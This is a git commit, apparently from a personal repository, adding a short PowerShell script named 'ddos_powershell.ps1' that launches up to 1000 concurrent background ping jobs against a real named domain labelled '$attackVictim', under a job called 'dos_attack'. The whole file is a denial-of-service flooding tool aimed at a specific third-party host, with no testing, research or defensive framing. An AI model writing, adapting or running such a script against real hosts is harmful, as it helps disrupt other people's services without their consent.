5335464e3d8ea3e4289d835d3e479f62f713e59a
Michal Turczyn <turek1992@o2.pl>
2022-03-08 00:51:14 +0100

    Added script to flood chosen URL with pings.

---
+++ ddos_powershell.ps1
@@ -0,0 +1,19 @@
+﻿$numberOfPings = 0;
+$maxNumberOfPings = 1000;
+$maxConcurrentPings = 100;
+$nameOfPingJob = 'dos_attack';
+$attackVictim = 'nspk.com';
+
+while($numberOfPings -lt $maxNumberOfPings)
+{
+    $jobsCount = (Get-Job | where { $_.Name -eq $nameOfPingJob -and $_.State -eq 'Running' }).Count
+
+    if($jobsCount -lt $maxConcurrentPings)
+    {
+        Start-Job -ScriptBlock { ping $args[0] } -ArgumentList $attackVictim -Name $nameOfPingJob | Out-Null
+        
+        $numberOfPings = $numberOfPings + 1
+
+        echo "Started no. $($numberOfPings) job"
+    }
+}
